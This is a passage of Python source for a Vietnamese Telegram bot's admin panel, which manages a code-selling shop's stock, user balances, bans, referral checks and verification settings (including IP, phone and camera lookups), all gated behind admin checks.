        "toggle_verify_ip": "verify_ip",
        "toggle_verify_channel": "verify_channel",
        "toggle_verify_captcha": "verify_captcha",
        "toggle_allow_withdraw": "allow_withdraw",
        "toggle_auto_buy_code": "auto_buy_code",
        "toggle_verify_camera": "verify_camera",
    }
    if data in key_map:
        setting_key = key_map[data]
        curr_val = await get_verify_setting(setting_key)
        new_val = not curr_val
        await set_verify_setting(setting_key, new_val)

        if data == "toggle_verify_cccam" and new_val:
            await reset_camera_verification()
            status_text = (
                "🟢 BẬT - toàn bộ thành viên phải xác minh lại Captcha & Camera"
            )
            try:
                await query.answer(f"CCCAM: {status_text}", show_alert=True)
            except Exception:
                pass
        else:
            status_text = "🟢 BẬT" if new_val else "🔴 TẮT"
            try:
                await query.answer(
                    f"Đã chuyển trạng thái sang {status_text}"
                )
            except Exception:
                pass

        text, reply_markup = await build_admin_menu()
        try:
            await query.edit_message_text(
                text, reply_markup=reply_markup, parse_mode="HTML"
            )
        except Exception:
            pass


async def adm_panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        return

    keyboard = [
        [
            abtn(
                "/broadcast (Gửi thông báo)",
                "MONEY_FLY",
                callback_data="adm_step_broadcast",
            ),
            abtn(
                "/addstock (Thêm mã code)",
                "PLUS",
                callback_data="adm_step_addstock",
            ),
        ],
        [
            abtn(
                "/addbal (Cộng tiền user)",
                "MONEY",
                callback_data="adm_step_addbal",
            ),
            abtn(
                "/subbal (Trừ tiền user)",
                "CARD",
                callback_data="adm_step_subbal",
            ),
        ],
        [
            abtn(
                "/info (Xem chi tiết user)",
                "BULB",
                callback_data="adm_step_info",
            ),
            abtn(
                "/detail (Kiểm tra ID chi tiết)",
                "SHIELD2",
                callback_data="adm_step_detail",
            ),
        ],
        [
            abtn(
                "/ban (Cấm vĩnh viễn)",
                "CROSS",
                callback_data="adm_step_ban",
            ),
            abtn(
                "/unban (Gỡ cấm user)",
                "UNLOCK",
                callback_data="adm_step_unban",
            ),
        ],
        [
            abtn(
                "/banwd (Cấm rút code)",
                "ALERT",
                callback_data="adm_step_banwd",
            ),
            abtn(
                "/unbanwd (Gỡ cấm rút code)",
                "TARGET",
                callback_data="adm_step_unbanwd",
            ),
        ],
        [
            abtn(
                "/stock (Thống kê kho code)",
                "BATTERY",
                callback_data="adm_act_stock",
            ),
            abtn(
                "/liststock (Danh sách code)",
                "INBOX",
                callback_data="adm_act_liststock",
            ),
        ],
        [
            abtn(
                "/users (Thống kê thành viên)",
                "PC",
                callback_data="adm_act_users",
            ),
            abtn(
                "/maint (Bật/Tắt bảo trì)",
                "PICK",
                callback_data="adm_act_maint",
            ),
        ],
        [abtn(
            "/resetverify (Reset xác minh toàn bộ)",
            "REFRESH",
            callback_data="adm_act_resetverify",
        )],
    ]

    msg = (
        f"{E['SHIELD']} <b>BẢNG ĐIỀU KHIỂN LỆNH ADMIN VIP</b> {E['CROWN']}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>Bấm vào các nút bên dưới, sau đó bạn chỉ cần gửi trực tiếp nội dung/số liệu cần thao tác:</i>\n\n"
        f"{E['RIGHT']} <b>/broadcast:</b> Gửi thông báo đến toàn bộ người dùng & nhóm.\n"
        f"{E['RIGHT']} <b>/addstock:</b> Thêm mã code mới vào kho (tự lọc code trùng).\n"
        f"{E['RIGHT']} <b>/addbal / subbal:</b> Cộng hoặc trừ số dư tài khoản user.\n"
        f"{E['RIGHT']} <b>/info / detail:</b> Xem thông tin chi tiết user.\n"
        f"{E['RIGHT']} <b>/ban / unban:</b> Quản lý trạng thái khóa tài khoản.\n"
        f"{E['RIGHT']} <b>/banwd / unbanwd:</b> Quản lý trạng thái cấm rút code.\n\n"
        f"{E['STAR']} <b>LỆNH MỚI:</b>\n"
        f"{E['RIGHT']} <b>/checkip:</b> Kiểm tra toàn bộ tài khoản trùng IP / SĐT / @name.\n"
        f"{E['RIGHT']} <b>/biofriends ID:</b> Kiểm tra bạn bè được mời có tiểu sử @Lienminhvietnam.\n"
        f"{E['RIGHT']} <b>/stats:</b> Bảng thống kê tổng quan hệ thống.\n"
        f"{E['RIGHT']} <b>/find từ_khóa:</b> Tìm user theo ID / @username / SĐT / IP.\n"
        f"{E['RIGHT']} <b>/lookup IP|SĐT|@name|ID:</b> Tra cứu full thông tin + ảnh camera.\n"
        f"{E['RIGHT']} <b>/banlist, /wdbanlist:</b> Danh sách bị khóa / bị cấm rút code.\n"
        f"{E['RIGHT']} <b>/topbal:</b> Top số dư cao nhất.\n"
        f"{E['RIGHT']} <b>/dupip, /dupphone:</b> IP / SĐT dùng chung nhiều tài khoản.\n"
        f"{E['RIGHT']} <b>/sendmsg ID nội_dung:</b> Nhắn riêng cho 1 user.\n"
        f"{E['RIGHT']} <b>/addgroup, /delgroup, /listgroup, /checkgroup:</b> Quản lý nhóm yêu cầu tham gia.\n"
        f"{E['RIGHT']} <b>/price, /setprice, /upprice, /downprice:</b> Xem / đổi giá code."
    )
    await update.message.reply_text(
        msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML"
    )


async def adm_step_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query or not is_admin(update):
        return
    data = query.data or ""
    user_id = query.from_user.id
    try:
        await query.answer()
    except Exception:
        pass

    if data.startswith("adm_act_"):
        admin_input_states.pop(user_id, None)
        action = data.replace("adm_act_", "")
        if action == "stock":
            res1 = await db_query(
                "SELECT COUNT(*) FROM code_stock WHERE is_used=0",
                fetchone=True,
            )
            cnt = res1[0] if res1 else 0
            await query.message.reply_text(
                f"{E['FIRE']} <b>Thống kê kho code:</b> Tổng số code chưa sử dụng: <b>{cnt:,}</b>",
                parse_mode="HTML",
            )
        elif action == "liststock":
            codes_list = await db_query(
                "SELECT id, code_val, created_at FROM code_stock WHERE is_used=0 ORDER BY id DESC LIMIT 20",
                fetchall=True,
            )
            if not codes_list:
                await query.message.reply_text(
                    f"{E['BANDAGE']} Kho code đang trống!", parse_mode="HTML"
                )
                return
            text_res = f"{E['TOP']} <b>20 Code mới nhất trong kho:</b>\n"
            for cid, cval, cat in codes_list:
                text_res += (
                    f"• ID: <code>{cid}</code> | Code: <code>{cval}</code>\n"
                )
            await query.message.reply_text(text_res, parse_mode="HTML")
        elif action == "users":
            res = await db_query("SELECT COUNT(*) FROM users", fetchone=True)
            await query.message.reply_text(
                f"{E['RIGHT']} Tổng số thành viên trong hệ thống: <b>{res[0]:,}</b>",
                parse_mode="HTML",
            )
        elif action == "maint":
            curr = await is_maintenance()
            new_val = "0" if curr else "1"
            await db_query(
                "UPDATE settings SET value=%s WHERE key='maintenance'",
                (new_val,),
                commit=True,
            )
            status_str = (
                "BẮT ĐẦU BẢO TRÌ 🔴"
                if new_val == "1"
                else "TẮT BẢO TRÌ 🟢"
            )
            await query.message.reply_text(
                f"{E['GEAR']} Trạng thái hệ thống đã đổi thành: <b>{status_str}</b>",
                parse_mode="HTML",
            )
        elif action == "resetverify":
            await db_query(
                "UPDATE users SET phone_number = NULL, ip_address = NULL, skip_ip = 0, captcha_verified = 0, miniapp_captcha_verified = 0, camera_verified = 0, cccam_verified = 0",
                commit=True,
            )
            await reset_all_ip_logs()
            pending_miniapp_captcha.clear()
            pending_camera_verified.clear()
            await query.message.reply_text(
                f"{E['REFRESH']} Đã đặt lại trạng thái xác minh toàn bộ thành viên!",
                parse_mode="HTML",
            )
        return

    step_map = {
        "adm_step_broadcast": (
            "broadcast",
            f"{E['MONEY_FLY']} <b>Nhập nội dung thông báo bạn muốn gửi:</b>\n<i>(Chỉ cần gửi nội dung, không cần gõ /broadcast)</i>",
        ),
        "adm_step_addstock": (
            "addstock",
            f"{E['PLUS']} <b>Nhập danh sách mã code cần thêm:</b>\n<i>(Có thể nhập nhiều mã cách nhau bằng khoảng trắng hoặc xuống dòng. Code trùng sẽ tự động bị lọc)</i>",
        ),
        "adm_step_addbal": (
            "addbal",
            f"{E['CROWN']} <b>Nhập thông tin theo cú pháp:</b> <code>USER_ID SỐ_TIỀN</code>\n<i>Ví dụ: 5633649201 50000</i>",
        ),
        "adm_step_subbal": (
            "subbal",
            f"{E['WARN']} <b>Nhập thông tin theo cú pháp:</b> <code>USER_ID SỐ_TIỀN</code>\n<i>Ví dụ: 5633649201 20000</i>",
        ),
        "adm_step_info": (
            "info",
            f"{E['CLIP']} <b>Nhập USER_ID cần xem thông tin cơ bản:</b>",
        ),
        "adm_step_detail": (
            "detail",
            f"{E['SHIELD']} <b>Nhập USER_ID cần kiểm tra chi tiết đầy đủ:</b>",
        ),
        "adm_step_ban": (
            "ban",
            f"{E['CROSS']} <b>Nhập USER_ID cần cấm vĩnh viễn:</b>",
        ),
        "adm_step_unban": (
            "unban",
            f"{E['CHECK']} <b>Nhập USER_ID cần gỡ cấm:</b>",
        ),
        "adm_step_banwd": (
            "banwd",
            f"{E['WARN']} <b>Nhập USER_ID cần cấm rút code:</b>",
        ),
        "adm_step_unbanwd": (
            "unbanwd",
            f"{E['RIGHT']} <b>Nhập USER_ID cần gỡ cấm rút code:</b>",
        ),
    }

    if data in step_map:
        cmd_type, prompt_text = step_map[data]
        admin_input_states[user_id] = cmd_type
        await query.message.reply_text(prompt_text, parse_mode="HTML")


async def build_user_info_text(target_id: int):
    u = await db_query(
        "SELECT * FROM users WHERE user_id=%s", (target_id,), fetchone=True
    )
    if not u:
        return None
    invited_count = await get_valid_referrals_count(target_id)
    username = f"@{u[1]}" if u[1] else "Chưa đặt"
    referrer = u[4] if u[4] is not None else "Không có"
    phone_val = u[8] if len(u) > 8 and u[8] else "Chưa xác minh"
    # IP lưu ở bảng ip_logs (không còn nằm trong users)
    ips = await get_user_ips(target_id)
    if ips:
        ip_lines = []
        for one_ip in ips[:5]:
            others = await db_query(
                "SELECT l.user_id, u.username FROM ip_logs l "
                "JOIN users u ON u.user_id = l.user_id "
                "WHERE l.ip_address=%s AND l.user_id<>%s "
                "ORDER BY u.joined_at ASC LIMIT 10",
                (one_ip, target_id),
                fetchall=True,
            )
            line = f"<code>{_html.escape(one_ip)}</code>"
            if others:
                names = ", ".join(
                    f"{('@' + _html.escape(n)) if n else 'N/A'} (<code>{i}</code>)"
                    for i, n in others
                )
                line += f"\n   {E['WARN']} Trùng với {len(others)} TK: {names}"
            ip_lines.append(line)
        ip_block = "\n".join(ip_lines)
    else:
        ip_block = "<code>Chưa xác minh</code>"
    return (
        f"{E['LOVE_FACE']} <b>THÔNG TIN CHI TIẾT USER</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{E['RIGHT']} ID: <code>{u[0]}</code>\n"
        f"{E['PHONE']} SĐT: <code>{phone_val}</code>\n"
        f"{E['GLOBE']} IP: {ip_block}\n"
        f"{E['CROWN2']} Username: {username}\n"
        f"{E['MONEY']} Số dư: <code>{u[2]:,}đ</code>\n"
        f"{E['RIGHT']} Khách giới thiệu: <code>{referrer}</code>\n"
        f"{E['ROCKET']} Đã mời thành công: <code>{invited_count}</code> người\n"
        f"{E['CROSS']} Khóa TK: <b>{'CÓ' if u[5] else 'KHÔNG'}</b>\n"
        f"{E['WARN']} Cấm rút code: <b>{'CÓ' if u[6] else 'KHÔNG'}</b>\n"
        f"{E['HOURGLASS']} Tham gia: <code>{u[7]}</code>"
    )


async def userinfo_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not query or not is_admin(update):
        return
    try:
        await query.answer()
    except Exception:
        pass
    try:
        target_id = int((query.data or "").replace("userinfo_", ""))
    except ValueError:
        return
    text = await build_user_info_text(target_id)
    if not text:
        await query.message.reply_text(
            f"{E['CROSS']} Không tìm thấy user này.", parse_mode="HTML"
        )
        return
    await query.message.reply_text(text, parse_mode="HTML")


ADMIN_PAGES = [
    {
        "icon": "CART",
        "title": "KHO CODE",
        "desc": (
            "• <b>/addstock</b> – thêm code (tự lọc trùng)\n"
            "• <b>/liststock</b> – 50 code mới nhất trong kho\n"
            "• <b>/stock</b> – thống kê số code còn lại\n"
            "• <b>/buyhistory</b> – 30 lượt mua code gần nhất\n"
            "• <b>/delhistory</b> – lịch sử code đã xóa\n"
            "• <b>/clearstock</b> – ⚠️ xóa TOÀN BỘ kho code"
        ),
        "items": [
            ("/addstock", "i", "addstock", "PLUS"),
            ("/liststock", "r", "liststock", "INBOX"),
            ("/stock", "r", "stock", "BATTERY"),
            ("/buyhistory", "r", "buyhistory", "CART"),
            ("/delhistory", "r", "delhistory", "TRASH"),
            ("/clearstock", "c", "clearstock", "ALERT"),
        ],
    },
    {
        "icon": "MONEY",
        "title": "SỐ DƯ & GIAO DỊCH",
        "desc": (
            "• <b>/addbal</b> – cộng tiền user\n"
            "• <b>/subbal</b> – trừ tiền user\n"
            "• <b>/topbal</b> – top 15 số dư cao nhất\n"
            "• <b>/txlog</b> – 20 giao dịch gần nhất của user\n"
            "• <b>/txfull</b> – toàn bộ lịch sử giao dịch của user\n"
            "• <b>/zerobal</b> – ⚠️ đưa số dư MỌI user về 0"
        ),
        "items": [
            ("/addbal", "i", "addbal", "MONEY_FLY"),
            ("/subbal", "i", "subbal", "MONEY2"),
            ("/topbal", "r", "topbal", "TOP"),
            ("/txlog", "i", "txlog", "CARD"),
            ("/txfull", "i", "txfull", "SCALE"),
            ("/zerobal", "c", "zerobal", "ALERT"),
        ],
    },
    {
        "icon": "UNLOCK",
        "title": "KHÓA / MỞ KHÓA",
        "desc": (
            "• <b>/ban</b> – khóa vĩnh viễn  |  <b>/unban</b> – gỡ khóa\n"
            "• <b>/banwd</b> – cấm rút code  |  <b>/unbanwd</b> – gỡ cấm rút\n"
            "• <b>/unall</b> – mở TẤT CẢ hạn chế (khóa, cấm rút, captcha, captcha MiniApp, IP)\n"
            "• <b>/uncap</b> – mở khóa + bỏ qua captcha (cả captcha MiniApp)\n"
            "• <b>/skipip</b> – bỏ qua kiểm tra IP\n"
            "• <b>/unip</b> – mở khóa trùng IP\n"
            "• <b>/banlist</b> – DS bị khóa  |  <b>/wdbanlist</b> – DS bị cấm rút"
        ),
        "items": [
            ("/ban", "i", "ban", "CROSS"),
            ("/unban", "i", "unban", "UNLOCK"),
            ("/banwd", "i", "banwd", "SHIELD"),
            ("/unbanwd", "i", "unbanwd", "TARGET"),
            ("/unall", "i", "unall", "LOVE1"),
            ("/uncap", "i", "uncap", "DICE"),
            ("/skipip", "i", "skipip", "LINK"),
            ("/unip", "i", "unip", "REFRESH"),
            ("/banlist", "r", "banlist", "PIN2"),
            ("/wdbanlist", "r", "wdbanlist", "PIN"),
        ],
    },
    {
        "icon": "BULB",
        "title": "TRA CỨU USER",
        "desc": (
            "• <b>/info</b> – thông tin cơ bản user\n"
            "• <b>/detail</b> – thông tin chi tiết + người giới thiệu\n"
            "• <b>/lookup</b> – tra cứu IP / SĐT / @name + gửi ảnh camera\n"
            "• <b>/checkip</b> – ⭐ kiểm tra TOÀN BỘ tài khoản trùng IP / SĐT / @name\n"
            "• <b>/find</b> – tìm theo ID / @username / SĐT / IP\n"
            "• <b>/friends</b> – danh sách bạn bè do user mời\n"
            "• <b>/users</b> – tổng thành viên + nút xem nhanh\n"
            "• <b>/dupip</b>, <b>/dupphone</b> – IP / SĐT dùng chung nhiều tài khoản"
        ),
        "items": [
            ("/info", "i", "info", "BULB"),
            ("/detail", "i", "detail", "SHIELD2"),
            ("/lookup", "i", "lookup", "IMAGE"),
            ("/checkip", "i", "checkip", "GLOBE"),
            ("/find", "i", "find", "TARGET"),
            ("/friends", "i", "friends", "NEXT"),
            ("/users", "r", "users", "PC"),
            ("/dupip", "r", "dupip", "LINK"),
            ("/dupphone", "r", "dupphone", "PHONE"),
        ],
    },
    {
        "icon": "SHIELD",
        "title": "BUFF REF & HỆ THỐNG",
        "desc": (
            "• <b>/biofriends</b> – check bio bạn bè của 1 user\n"
            "• <b>/checkref</b> – check bio người được giới thiệu\n"
            "• <b>/scanbio</b>, <b>/banbuff</b> – quét & khóa toàn hệ thống\n"
            "• <b>/broadcast</b> – thông báo toàn bộ  |  <b>/sendmsg</b> – nhắn 1 user\n"
            "• <b>/stats</b> – thống kê tổng quan\n"
            "• <b>/maint</b> – bật/tắt bảo trì\n"
            "• <b>/resetverify</b> – ⚠️ reset xác minh toàn bộ\n"
            "• <b>/wipeall</b> – ⚠️ XÓA SẠCH dữ liệu hệ thống\n"
            "• <b>Cài đặt</b> – bật/tắt SĐT, CCCAM, Captcha MiniApp, IP, Camera, Kênh, Captcha, Rút tiền, Auto mua code"
        ),
        "items": [
            ("/biofriends", "i", "biofriends", "SHIELD2"),
            ("/checkref", "i", "checkref", "PIN2"),
            ("/scanbio", "c", "scanbio", "PICK"),
            ("/banbuff", "c", "banbuff", "ALERT"),
            ("/broadcast", "i", "broadcast", "BOOM"),
            ("/sendmsg", "i", "sendmsg", "MAIL"),
            ("/stats", "r", "stats", "TOP2"),
            ("/maint", "r", "maint", "PC"),
            ("/resetverify", "c", "resetverify", "REFRESH"),
            ("/wipeall", "c", "wipeall", "TRASH"),
            ("Cài đặt bật/tắt", "s", "", "LAPTOP"),
        ],
    },
    {
        "icon": "TOP",
        "title": "NHÓM YÊU CẦU & GIÁ CODE",
        "desc": (
            "• <b>/addgroup</b> – thêm nhóm/kênh bắt buộc (bot phải là admin)\n"
            "• <b>/delgroup</b> – xóa nhóm (nhập ID số trong danh sách hoặc @username)\n"
            "• <b>/listgroup</b> – danh sách nhóm đang yêu cầu\n"
            "• <b>/checkgroup</b> – kiểm tra bot có là admin ở TẤT CẢ nhóm không\n"
            "• <b>/checkadmin</b> – kiểm tra bot có là admin ở 1 nhóm cụ thể không\n"
            "• <b>/clearallgroup</b> – ⚠️ xóa TẤT CẢ nhóm yêu cầu tham gia\n"
            "• <b>/price</b> – xem giá code hiện tại\n"
            "• <b>/setprice</b> – đặt giá mới  |  <b>/upprice</b> – tăng giá  |  <b>/downprice</b> – giảm giá"
        ),
        "items": [
            ("/addgroup", "i", "addgroup", "PLUS"),
            ("/delgroup", "i", "delgroup", "TRASH"),
            ("/listgroup", "r", "listgroup", "PIN2"),
            ("/checkgroup", "r", "checkgroup", "SHIELD2"),
            ("/checkadmin", "i", "checkadmin", "TARGET"),
            ("/clearallgroup", "c", "clearallgroup", "ALERT"),
            ("/price", "r", "price", "CARD"),
            ("/setprice", "i", "setprice", "MONEY"),
            ("/upprice", "i", "upprice", "UPRIGHT"),
            ("/downprice", "i", "downprice", "NEXT"),
        ],
    },
]

ADMIN_INPUT_PROMPTS = {
    "addstock": "Nhập danh sách code (cách nhau bằng khoảng trắng hoặc xuống dòng):",
    "addbal": "Nhập: <code>USER_ID SỐ_TIỀN</code>\n<i>Ví dụ: 5633649201 50000</i>",
    "subbal": "Nhập: <code>USER_ID SỐ_TIỀN</code>\n<i>Ví dụ: 5633649201 20000</i>",
    "txlog": "Nhập <b>USER_ID</b> cần xem 20 giao dịch gần nhất:",
    "txfull": "Nhập <b>USER_ID</b> cần xem toàn bộ lịch sử giao dịch:",
    "ban": "Nhập <b>USER_ID</b> cần khóa vĩnh viễn:",
    "unban": "Nhập <b>USER_ID</b> cần gỡ khóa:",
    "banwd": "Nhập <b>USER_ID</b> cần cấm rút code:",
    "unbanwd": "Nhập <b>USER_ID</b> cần gỡ cấm rút code:",
    "unall": "Nhập <b>USER_ID</b> cần mở tất cả hạn chế:",
    "uncap": "Nhập <b>USER_ID</b> cần mở khóa captcha/tài khoản:",
    "skipip": "Nhập <b>USER_ID</b> cần bỏ qua kiểm tra IP:",
    "unip": "Nhập <b>USER_ID</b> cần mở khóa trùng IP:",
    "info": "Nhập <b>USER_ID</b> cần xem thông tin cơ bản:",
    "detail": "Nhập <b>USER_ID</b> cần xem thông tin chi tiết:",
    "checkip": (
        "Nhập <b>IP / Số điện thoại / @username / USER_ID</b> cần check trùng IP (hoặc gõ <code>all</code> để xem toàn bộ IP trùng):\n"
        "<i>VD: <code>113.161.1.1</code> hoặc <code>+84901234567</code> hoặc <code>@username</code></i>"
    ),
    "find": "Nhập từ khóa: <b>ID / @username / SĐT / IP</b>",
    "lookup": "Nhập <b>IP / SĐT / @username / USER_ID</b> để tra cứu + xem ảnh camera:",
    "friends": "Nhập <b>USER_ID</b> cần xem danh sách bạn bè đã mời:",
    "biofriends": "Nhập <b>USER_ID</b> người mời cần check bio bạn bè:",
    "checkref": "Nhập <b>USER_ID hoặc @username</b> người giới thiệu:",
    "broadcast": "Nhập nội dung thông báo gửi toàn bộ người dùng & nhóm:",
    "sendmsg": "Nhập: <code>USER_ID Nội dung tin nhắn</code>",
    "addgroup": "Nhập: <code>@username</code> hoặc link <code>t.me/...</code>\n<i>Nhóm riêng tư:</i> <code>-100123... https://t.me/+linkmoi</code>\n⚠️ Bot phải là <b>admin</b> của nhóm trước.",
    "delgroup": "Nhập <b>ID số</b> (trong /listgroup) hoặc <b>@username</b> nhóm cần xóa:",
    "checkadmin": "Nhập <b>@username / link / ID</b> nhóm cần kiểm tra bot đã là admin chưa:",
    "setprice": "Nhập giá code mới (VD: <code>3000</code>):",
    "upprice": "Nhập số tiền muốn <b>TĂNG</b> giá (VD: <code>500</code>):",
    "downprice": "Nhập số tiền muốn <b>GIẢM</b> giá (VD: <code>500</code>):",
}

ADMIN_CONFIRM_TEXT = {
    "clearstock": "XÓA TOÀN BỘ KHO CODE",
    "zerobal": "ĐƯA SỐ DƯ CỦA TẤT CẢ USER VỀ 0",
    "scanbio": "QUÉT BIO TOÀN HỆ THỐNG VÀ KHÓA TÀI KHOẢN BUFF (mất khá nhiều thời gian)",
    "banbuff": "QUÉT BIO TOÀN HỆ THỐNG VÀ KHÓA TÀI KHOẢN BUFF (mất khá nhiều thời gian)",
    "resetverify": "RESET XÁC MINH CỦA TOÀN BỘ THÀNH VIÊN",
    "wipeall": "XÓA SẠCH TOÀN BỘ NGƯỜI DÙNG, KHO CODE VÀ GIAO DỊCH",
    "clearallgroup": "XÓA TẤT CẢ NHÓM/KÊNH YÊU CẦU THAM GIA (user sẽ không bị bắt tham gia nhóm nào nữa)",
}

_ADMIN_ALL_CMDS = {
    cmd for pg in ADMIN_PAGES for _, _, cmd, _ in pg["items"] if cmd
}

ADMIN_TAB_NAMES = [
    "Kho Code",
    "Số Dư",
    "Khóa/Mở",
    "Tra Cứu",
    "Hệ Thống",
    "Nhóm & Giá",
]
ADMIN_NAV_TEXTS = {"Trang Trước", "Trang Sau", "Đóng Menu"}
admin_menu_page = {}

ADMIN_KB_ACTIONS = {
    label.lstrip("/"): (mode, cmd)
    for pg in ADMIN_PAGES
    for label, mode, cmd, _ in pg["items"]
}


def _akb(text: str, key: str) -> KeyboardButton:
    return KeyboardButton(
        text, api_kwargs={"icon_custom_emoji_id": AI[key][0]}
    )


def get_admin_keyboard(page: int) -> ReplyKeyboardMarkup:
    last = len(ADMIN_PAGES) - 1
    tabs = [
        _akb(("• " if i == page else "") + ADMIN_TAB_NAMES[i], p["icon"])
        for i, p in enumerate(ADMIN_PAGES)
    ]
    rows = [tabs[:3], tabs[3:]]
    row = []
    for label, mode, cmd, icon in ADMIN_PAGES[page]["items"]:
        row.append(_akb(label.lstrip("/"), icon))
        if len(row) == 2:
            rows.append(row)
            row = []
    if row:
        rows.append(row)
    nav = []
    if page > 0:
        nav.append(_akb("Trang Trước", "PIN2"))
    if page < last:
        nav.append(_akb("Trang Sau", "NEXT"))
    if nav:
        rows.append(nav)
    rows.append([_akb("Đóng Menu", "CROSS")])
    return ReplyKeyboardMarkup(rows, resize_keyboard=True)


def build_admin_page_text(page: int) -> str:
    pg = ADMIN_PAGES[page]
    return (
        f"{E['GEAR']} <b>MENU QUẢN TRỊ — {ai(pg['icon'])} {pg['title']}</b>\n"
        f"Trang <b>{page + 1}/{len(ADMIN_PAGES)}</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"{pg['desc']}\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"<i>Bấm nút ở bàn phím bên dưới để thao tác. Lệnh cần dữ liệu sẽ hỏi bạn nhập.</i>"
    )


def is_admin_kb_text(txt: str) -> bool:
    raw = txt[2:] if txt.startswith("• ") else txt
    return (
        raw in ADMIN_TAB_NAMES
        or raw in ADMIN_NAV_TEXTS
        or raw in ADMIN_KB_ACTIONS
    )


async def show_admin_page(message, uid: int, page: int):
    page = max(0, min(page, len(ADMIN_PAGES) - 1))
    admin_menu_page[uid] = page
    admin_input_states.pop(uid, None)
    await message.reply_text(
        build_admin_page_text(page),
        reply_markup=get_admin_keyboard(page),
        parse_mode="HTML",
    )


async def admin_keyboard_handler(
    update: Update, context: ContextTypes.DEFAULT_TYPE, text: str
) -> bool:
    user = update.effective_user
    message = update.effective_message
    if not user or user.id not in ADMIN_IDS or not message:
        return False
    uid = user.id
    raw = text[2:] if text.startswith("• ") else text
    cur = admin_menu_page.get(uid, 0)

    if raw in ADMIN_TAB_NAMES:
        await show_admin_page(message, uid, ADMIN_TAB_NAMES.index(raw))
        return True
    if raw == "Trang Sau":
        await show_admin_page(message, uid, cur + 1)
        return True
    if raw == "Trang Trước":
        await show_admin_page(message, uid, cur - 1)
        return True
    if raw == "Đóng Menu":
        admin_input_states.pop(uid, None)
        admin_menu_page.pop(uid, None)
        await message.reply_text(
            f"{E['CHECK2']} Đã đóng menu quản trị.",
            reply_markup=get_main_keyboard(uid),
            parse_mode="HTML",
        )
        return True

    if raw in ADMIN_KB_ACTIONS:
        mode, cmd = ADMIN_KB_ACTIONS[raw]
        if mode == "s":
            admin_input_states.pop(uid, None)
            t, markup = await build_admin_menu()
            await message.reply_text(
                t, reply_markup=markup, parse_mode="HTML"
            )
        elif mode == "i":
            admin_input_states[uid] = cmd
            prompt = ADMIN_INPUT_PROMPTS.get(cmd, "Nhập dữ liệu:")
            await message.reply_text(
                f"{E['RIGHT']} <b>/{cmd}</b>\n{prompt}", parse_mode="HTML"
            )
        elif mode == "r":
            admin_input_states.pop(uid, None)
            await admin_commands(update, context, override_cmd=f"/{cmd}")
        elif mode == "c":
            admin_input_states.pop(uid, None)
            warn = ADMIN_CONFIRM_TEXT.get(cmd, "THỰC HIỆN LỆNH NÀY")
            markup = InlineKeyboardMarkup([[
                abtn("Xác nhận", "MEDAL", callback_data=f"amy_{cmd}"),
                abtn("Hủy", "CROSS", callback_data="amcancel"),
            ]])
            await message.reply_text(
                f"{E['WARN']} <b>XÁC NHẬN LỆNH /{cmd}</b>\n━━━━━━━━━━━━━━━━━━\n"
                f"Bạn sắp: <b>{warn}</b>\nThao tác này không thể hoàn tác!",
                reply_markup=markup,
                parse_mode="HTML",
            )
        return True
    return False


async def admin_confirm_callback(
    update: Update, context: ContextTypes.DEFAULT_TYPE
):
    query = update.callback_query
    if not query:
        return
    if not is_admin(update):
        await query.answer(
            "Bạn không có quyền thực hi!", show_alert=True
        )
        return
    try:
        await query.answer()
    except Exception:
        pass
    data = query.data or ""
    if data == "amcancel":
        try:
            await query.edit_message_text(
                f"{E['CROSS']} Đã hủy thao tác.", parse_mode="HTML"
            )
        except Exception:
            pass
        return
    if data.startswith("amy_"):
        cmd = data[4:]
        if cmd not in _ADMIN_ALL_CMDS:
            return
        try:
            await query.edit_message_text(
                f"{E['HOURGLASS']} Đang thực hiện /{cmd}...", parse_mode="HTML"
            )
        except Exception:
            pass
        await admin_commands(update, context, override_cmd=f"/{cmd}")


async def admin_commands(
    update: Update, context: ContextTypes.DEFAULT_TYPE, override_cmd: str = None
):
    if not is_admin(update):
        return
    message = update.effective_message
    if not message:
        return
    user_id = update.effective_user.id
    chat_id = message.chat_id

    args = list(context.args or [])
    raw_text = message.text or ""
    cmd = (raw_text.split()[0].split("@")[0].lower()) if raw_text.strip() else ""

    if override_cmd:
        cmd = override_cmd
        args = []
        raw_text = override_cmd

    elif user_id in admin_input_states and not raw_text.lstrip().startswith("/"):
        cmd_type = admin_input_states.pop(user_id)
        text_input = (message.text or "").strip()

        if cmd_type == "broadcast":
            args = text_input.split()
            raw_text = f"/broadcast {text_input}"
        elif cmd_type == "addstock":
            args = text_input.split()
            raw_text = f"/addstock {text_input}"
        elif cmd_type in ("addbal", "subbal"):
            parts = text_input.split()
            if len(parts) >= 2:
                args = parts
                raw_text = f"/{cmd_type} {parts[0]} {parts[1]}"
            else:
                admin_input_states[user_id] = cmd_type
                await message.reply_text(
                    f"{E['CROSS']} Sai cú pháp. Vui lòng nhập lại: <code>USER_ID SỐ_TIỀN</code>",
                    parse_mode="HTML",
                )
                return
        elif cmd_type in (
            "info",
            "detail",
            "ban",
            "unban",
            "banwd",
            "unbanwd",
            "checkip",
        ):
            parts = text_input.split()
            if parts:
                args = [parts[0]]
                raw_text = f"/{cmd_type} {parts[0]}"
            else:
                admin_input_states[user_id] = cmd_type
                await message.reply_text(
                    f"{E['CROSS']} Vui lòng nhập dữ liệu hợp lệ.", parse_mode="HTML"
                )
                return
        else:
            if not text_input:
                admin_input_states[user_id] = cmd_type
                await message.reply_text(
                    f"{E['CROSS']} Vui lòng nhập dữ liệu hợp lệ.",
                    parse_mode="HTML",
                )
                return
            args = text_input.split()
            raw_text = f"/{cmd_type} {text_input}"
        cmd = f"/{cmd_type}"

    try:
        if cmd == "/addstock":
            lines = raw_text.split(maxsplit=1)
            if len(lines) < 2:
                await message.reply_text(
                    f"{E['WARN']} <b>Cú pháp:</b> <code>/addstock mã_code1 mã_code2 ...</code>\n"
                    f"Hoặc xuống dòng từng mã code để thêm số lượng lớn. Bot sẽ tự động phân tích, lọc code trùng và thêm vào kho.",
                    parse_mode="HTML",
                )
                return
            codes_raw = lines[1]
            codes = re.split(r"[\s\n]+", codes_raw.strip())
            codes = [c.strip() for c in codes if c.strip()]
            if not codes:
                await message.reply_text(
                    f"{E['CROSS']} Không tìm thấy mã code hợp lệ.",
